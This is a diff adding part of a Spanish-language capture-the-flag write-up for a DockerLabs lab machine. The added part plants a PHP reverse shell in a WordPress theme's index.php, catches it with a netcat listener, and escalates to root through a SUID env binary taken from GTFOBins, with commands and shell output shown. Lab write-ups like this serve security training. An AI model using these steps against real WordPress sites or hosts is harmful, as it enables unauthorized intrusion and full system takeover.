@@ -163,7 +163,71 @@ Vemos que tenemos acceso al panel de **/wp-admin** y que con las credenciales ob
 ## Explotación.
 Cuando tenemos acceso a un panel de wordpress, lo primero que deberíamos hacer, es ir a ver si podemos modificar una página del tema y así poner nuestro código malicioso y de esta forma podemos obtener una reverse shell.
 
+![indexphp](https://github.com/TBrux/DOCKERLABS/assets/168732212/9d40c2ea-2fe3-4989-b474-eb060b2b2526)
 
+Ahora lo único que tenemos que hacer es modificar alguna de las páginas, en mi caso voy a modificar el index con una reverse shell en php que encontramos en [GITHUB](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
 
-Como estamos en la página
+Nos ponemos a la escucha en el puerto que hayamos indicado y nos dirigimos al recurso modificado.
+```
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+```
+```bash
+http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
+```
+Y obtenemos acceso a la máquina con el usuario **www-data**.
+```
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49278
+Linux cf370cc70c6b 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux
+ 15:22:54 up 42 min,  0 user,  load average: 0.30, 0.37, 0.52
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+```
+Hacemos un tratamiento de la tty para trabajar más cómodamente.
+```bash
+$ script /dev/null -c bash
+CTRL + Z
+❯ stty -raw echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+## Escalada de privilegios.
+Para la escaldad de privilegios vamos a buscar binarios con permisos SUID desde la raíz.
+```bash
+find / -perm -4000 2>/dev/null
+```
+```
+www-data@cf370cc70c6b:/$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/umount
+www-data@cf370cc70c6b:/$
+```
+Vemos que tenemos el binario **/usr/bin/env**, que si buscamos en [GTFOBins](https://gtfobins.github.io/gtfobins/env/) podemos ver que podemos utilizarlo para lanzarnos una shell con los permisos de **root**.
+```bash
+./usr/bin/env /bin/sh -p
+```
+```
+www-data@cf370cc70c6b:/$ ./usr/bin/env /bin/sh -p
+./usr/bin/env /bin/sh -p
+# whoami
+whoami
+root
+# 
+```
 
